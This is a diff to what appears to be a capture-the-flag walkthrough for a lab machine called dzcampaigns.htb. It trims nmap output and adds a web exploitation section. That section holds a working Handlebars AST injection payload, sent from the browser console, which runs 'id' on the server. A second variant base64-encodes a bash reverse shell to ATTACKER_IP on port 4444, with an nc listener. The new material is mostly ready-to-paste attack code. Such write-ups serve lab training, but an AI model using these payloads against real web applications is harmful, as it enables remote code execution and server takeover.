@@ -53,16 +53,7 @@ Start the Machine.
 #### 1.2.1 Full Port Sweep
 
 ```shell
-nmap -p- --min-rate 5000 -Pn 10.129.46.72 
-Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 04:00 -0400
-Nmap scan report for 10.129.46.72
-Host is up (0.31s latency).
-Not shown: 65533 filtered tcp ports (no-response)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 27.95 seconds
+nmap -p- --min-rate 5000 -Pn 10.129.46.72
 ```
 <div align="center">
 <br>
@@ -74,35 +65,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.95 seconds
 #### 1.2.2 The "Deep Dive" Scan (Targeted Aggression)
 
 ```shell
-nmap -A -p 22,80 10.129.46.72            
-Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 04:01 -0400
-Nmap scan report for 10.129.46.72
-Host is up (0.22s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
-|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
-80/tcp open  http    nginx 1.24.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://dzcampaigns.htb/
-|_http-server-header: nginx/1.24.0 (Ubuntu)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running (JUST GUESSING): Microsoft Windows 2022|11|2012|2016 (88%)
-OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
-Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 24H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 80/tcp)
-HOP RTT       ADDRESS
-1   224.21 ms 10.10.14.1
-2   224.66 ms 10.129.46.72
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 39.20 seconds
+nmap -A -p 22,80 10.129.46.72    
 ```
 <div align="center">
 <br>
@@ -127,7 +90,82 @@ echo "TARGET_IP dzcampaigns.htb" | sudo tee -a /etc/hosts
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
 
-## 3. Exploitation
+## 2. Web exploitation (Handlebars AST → RCE)
+
+**2.3 — register + log in** at `http://dzcampaigns.htb/register`, create a character; note the character ID from the edit URL (`/character/<ID>/edit`). Below assumes ID 15.
+
+**3.1 — RCE test.** At `http://dzcampaigns.htb/character/15/edit` → DevTools → Console:
+
+javascript
+
+```javascript
+const csrf = document.querySelector('[name="_csrf"]').value;
+const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };
+const ast = {
+  type: "Program",
+  body: [{
+    type: "MustacheStatement",
+    path: { type: "PathExpression", data: false, depth: 0, parts: ["lookup"], original: "lookup", loc: L },
+    params: [
+      { type: "PathExpression", data: false, depth: 0, parts: [], original: "this", loc: L },
+      { type: "NumberLiteral",
+        value: "{},{})) + process.mainModule.require('child_process').execSync('id').toString() //",
+        original: 1, loc: L }
+    ],
+    escaped: true, strip: { open: false, close: false }, loc: L
+  }],
+  strip: {}, loc: L
+};
+const r = await fetch("/character/15", {
+  method: "POST", credentials: "same-origin",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue", backstory: "test", campaign_message: ast })
+});
+console.log(r.status, await r.text());
+```
+
+Read result at `http://dzcampaigns.htb/campaign/1` — expect `uid=996(darkzero)`.
+
+**3.2 — reverse shell.** Listener on Kali:
+
+bash
+
+```bash
+nc -lvnp 4444
+```
+
+Then in Console (same block, swap the payload):
+
+javascript
+
+```javascript
+const csrf = document.querySelector('[name="_csrf"]').value;
+const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };
+const cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";
+const b64 = btoa(cmd);
+const payload = `{},{})) + process.mainModule.require('child_process').exec('echo ${b64} | base64 -d | bash') //`;
+const ast = {
+  type: "Program",
+  body: [{
+    type: "MustacheStatement",
+    path: { type: "PathExpression", data: false, depth: 0, parts: ["lookup"], original: "lookup", loc: L },
+    params: [
+      { type: "PathExpression", data: false, depth: 0, parts: [], original: "this", loc: L },
+      { type: "NumberLiteral", value: payload, original: 1, loc: L }
+    ],
+    escaped: true, strip: { open: false, close: false }, loc: L
+  }],
+  strip: {}, loc: L
+};
+const r = await fetch("/character/15", {
+  method: "POST", credentials: "same-origin",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue", backstory: "test", campaign_message: ast })
+});
+console.log(r.status);
+```
+
+Visit `http://dzcampaigns.htb/campaign/1` to fire it.
 <div align="center">
 <br>
 <br>
